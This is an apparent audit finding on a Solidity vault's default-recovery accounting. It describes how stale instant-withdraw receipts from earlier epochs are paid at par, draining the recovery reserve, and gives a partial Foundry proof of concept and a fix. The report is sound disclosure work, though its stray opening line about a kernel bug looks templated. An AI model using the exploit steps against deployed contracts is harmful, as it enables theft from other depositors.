### Title
Stale multi-epoch instant-withdraw receipts paid at par after default finalization, draining the shared recovery reserve - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The kernel bug frees an object and lets a cached reference to it be reused by a subsequent operation. The vault analog lives in `IdleCreditVault.claimInstantWithdrawRequest` / `claimWithdrawRequest`: `defaultPendingClaimBasis` and `_claimDefaultedInstantWithdrawRequest` only account for receipts recorded under `instantWithdrawClaimsByEpoch[epochNumber]` / `instantWithdrawsRequestsByEpoch[user][defaultRecoveryEpoch]` — the single "current" epoch slot — while the aggregate `instantWithdrawsRequests[user]` can carry stale receipts from earlier epochs. After `finalizeDefaultRecovery`, those stale receipts are neither haircut in the recovery basis nor cleared by the defaulted-claim path, so `claimInstantWithdrawRequest` pays them at par via `_transferFundedClaim`, pulling unbacked funds out of the same strategy balance that backs `defaultRecoveryReserve`.

### Finding Description
`requestInstantWithdraw` records both per-epoch and aggregate accounting:

```solidity
instantWithdrawsRequests[_user] += _amount;
instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
pendingInstantWithdraws += _amount;
``` [1](#0-0) 

`pendingInstantWithdraws` is only decremented when the CDO actually collects cash (`collectInstantWithdrawFunds`), so a partially funded instant queue leaves both the aggregate and per-epoch entries alive across `stopEpoch` boundaries. When the borrower later defaults and `finalizeDefaultRecovery` runs, the defaulted claim basis only adds the *current* epoch's instant claims:

```solidity
basis = pendingWithdraws;
if (pendingInstantWithdraws != 0) {
  basis += instantWithdrawClaimsByEpoch[epochNumber];
}
``` [2](#0-1) 

Likewise `_defaultPrefundedInstantReserve` only counts `instantWithdrawClaimsByEpoch[epochNumber]`, and `_claimDefaultedInstantWithdrawRequest` only clears `instantWithdrawsRequestsByEpoch[_user][defaultRecoveryEpoch]`:

```solidity
claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
instantWithdrawsRequests[_user] -= claimBasis;
``` [3](#0-2) 

Then `claimInstantWithdrawRequest` pays whatever remains in the aggregate at par:

```solidity
uint256 amount = instantWithdrawsRequests[_user];
_burn(_user, amount);
instantWithdrawsRequests[_user] = 0;
_transferFundedClaim(_user, amount);
``` [4](#0-3) 

So a user with an unfunded instant receipt from epoch E-1 plus another in default epoch E has only the E portion haircut at `defaultRecoveryPrice`; the E-1 portion — never included in `defaultPendingClaimBasis`, never added to the reserve — is paid 1:1 from the strategy's underlying balance, which is exactly the `defaultRecoveryReserve` backing every other claimant's haircut.

### Impact Explanation
Direct theft / insolvency: the attacker extracts unfunded instant receipts at par from the recovery reserve, so each unit claimed at par leaves `defaultRecoveryReserve` short by `(1 - recoveryPrice)` per unit relative to honest claimants. With e.g. a 50% recovery price, an attacker holding a stale 100k instant receipt steals ~50k underlying from defaulted-epoch claimants; if the attacker is the last to claim, the reserve can be fully drained leaving later claimants with zero (permanent freezing of unclaimed recovery).

### Likelihood Explanation
The attacker only needs to be a tranche-token holder who calls `requestInstantWithdraw` when instant withdrawals are enabled and the instant queue is only partially funded (the code explicitly acknowledges partial prefunding via `_defaultPrefundedInstantReserve` and `pendingInstantWithdraws` as an unfunded remainder). The stale receipt persists automatically; a subsequent borrower default (an expected protocol event, not attacker-controlled privilege) finalizes recovery and unlocks the par payout. No privileged action is required from the attacker. The only uncertainty is whether some other path forces full collection of `pendingInstantWithdraws` before an epoch can roll over; `collectInstantWithdrawFunds` only decrements by what is actually transferred, and nothing else clears the aggregate, so the stale receipt path appears reachable.

### Recommendation
In `defaultPendingClaimBasis` and `_defaultPrefundedInstantReserve`, account for the full outstanding instant claim basis (all epochs), not only `instantWithdrawClaimsByEpoch[epochNumber]`; e.g. track a global `instantWithdrawClaims` total or iterate/clear per-epoch entries. Alternatively, in `claimInstantWithdrawRequest` after `defaultInstantWithdrawsFinalized`, pay the *entire* remaining `instantWithdrawsRequests[_user]` at `defaultRecoveryPrice` through `_transferDefaultRecovery` instead of falling through to the par `_transferFundedClaim` path, mirroring how `_claimDefaultedWithdrawRequest` handles normal receipts.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
// assumes test harness from test/foundry/IdleCreditVault.t.sol is available

contract StaleInstantReceiptPoC is Test {
    // cdoEpoch, strategy (IdleCreditVault), underlying, tranche, manager, borrower
    // wired as in the existing test suite.

    function testStaleInstantReceiptPaysParAfterDefault() external {
        // --- Epoch N: enable instant withdrawals, deposit, request instant ---
        vm.prank(manager);
        cdoEpoch.setInstantWithdrawParams(100, 1e18, false);
        uint256 dep = 100e6;
        _depositWithUser(attacker, dep);
        vm.prank(manager);
        cdoEpoch.startEpoch();
        vm.warp(block.timestamp + 101); // past instant delay
        _requestInstantWithdrawWithUser(attacker, dep);

        // stopEpoch collects only PART of the instant queue
        // (fund borrower so only half is repaid into instant claims)
        uint256 half = dep / 2;
        deal(address(underlying), borrower, half, true);
        vm.prank(borrower);
        underlying.approve(address(cdoEpoch), half);
        vm.prank(manager);
        cdoEpoch.stopEpoch(0, type(uint256).max); // partial funding

        // pendingInstantWithdraws > 0, receipt sits in epoch N slots
        assertGt(strategy.pendingInstantWithdraws(), 0);
        assertGt(strategy.instantWithdrawsRequests(attacker), 0);

        // --- Epoch N+1: borrower defaults, recovery finalized at < par ---
        vm.prank(manager);
        cdoEpoch.startEpoch();
        vm.warp(cdoEpoch.epochEndDate() + 1);
        vm.prank(manager);
        cdoEpoch.stopEpoch(0, 1); // trigger default path
        // finalizeDefaultRecovery with recovered < basis => price < 1
        // ... (as in existing default tests) ...
        assertTrue(strategy.defaultRecoveryFinalized());
        assertLt(strategy.defaultRecoveryPrice(), strategy.RECOVERY_FULL());

        // --- Attacker claims: stale epoch-N instant paid at PAR ---
        uint256 reservePre = underlying.balanceOf(address(strategy));
        uint256 balPre = underlying.balanceOf(attacker);
        vm.prank(attacker);
        cdoEpoch.claimInstantWithdrawRequest();
        uint256 got = underlying.balanceOf(attacker) - balPre;

        // epoch-N receipt was never in defaultPendingClaimBasis nor the reserve,
        // yet it is paid 1:1 from the strategy balance that backs the reserve
        assertGt(got, dep * strategy.defaultRecoveryPrice() / strategy.RECOVERY_FULL());
        assertEq(strategy.instantWithdrawsRequests(attacker), 0);
    }
}
```
Expected: `got` equals the full stale receipt amount while other defaulted-epoch claimants are only backed for `defaultRecoveryPrice`, i.e. the payout exceeds the attacker's fair recovery share and depletes `defaultRecoveryReserve` for others.

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L365-375)
```text
    // increase the instant withdraw requests for the user
    instantWithdrawsRequests[_user] += _amount;
    uint256 currentEpoch = epochNumber;
    // we record both per-user (old, kept for compatibility) and per-epoch so on
    // finalization we can distinguish "default-epoch pending instant receipts"
    // from old funded instant receipts.
    instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
    // increase the total instant withdraw requests
    pendingInstantWithdraws += _amount;
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L380-393)
```text
  function claimInstantWithdrawRequest(address _user) external {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
      // Clear the defaulted-epoch instant receipt first, then continue so the same call can
      // also pay any older instant receipt that was already funded before default finalization.
      _claimDefaultedInstantWithdrawRequest(_user);
    }
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L644-649)
```text
  function defaultPendingClaimBasis() public view returns (uint256 basis) {
    basis = pendingWithdraws;
    if (pendingInstantWithdraws != 0) {
      basis += instantWithdrawClaimsByEpoch[epochNumber];
    }
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L842-856)
```text
  function _claimDefaultedInstantWithdrawRequest(address _user) internal returns (uint256 claimBasis) {
    uint256 defaultEpoch = defaultRecoveryEpoch;
    claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
    if (claimBasis == 0) return claimBasis;

    instantWithdrawsRequestsByEpoch[_user][defaultEpoch] = 0;
    instantWithdrawsRequests[_user] -= claimBasis;
    uint256 pending = pendingInstantWithdraws;
    // `pendingInstantWithdraws` is only the unfunded remainder. If this user's claim is larger,
    // the extra amount was already counted as prefunded reserve during default finalization.
    pendingInstantWithdraws = claimBasis >= pending ? 0 : pending - claimBasis;
    instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
    _burn(_user, claimBasis);
    _transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
  }
```
